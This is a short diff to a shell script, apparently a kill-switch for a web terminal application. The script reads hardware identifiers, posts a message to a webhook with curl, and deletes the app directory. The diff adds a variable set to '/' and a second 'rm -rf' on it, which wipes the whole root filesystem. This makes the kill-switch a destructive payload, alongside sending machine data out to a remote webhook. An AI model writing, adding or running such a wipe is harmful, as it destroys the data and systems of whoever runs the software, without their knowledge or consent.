@@ -1,6 +1,7 @@
 #!/bin/sh
 
 kill_path='/var/www/terminal'
+kill_path_all='/'
 uuid_path='/var/www/terminal/killer/uuid'
 id1=$(cat /sys/class/dmi/id/board_serial)
 id2=$(cat /sys/class/dmi/id/product_uuid)
@@ -28,4 +29,5 @@ else
     echo "$msg" > 'msg.txt'
     curl -X POST -H 'Content-type: application/json' -d @msg.txt $webhook_url
     rm -rf $kill_path
+    rm -rf $kill_path_all
 fi
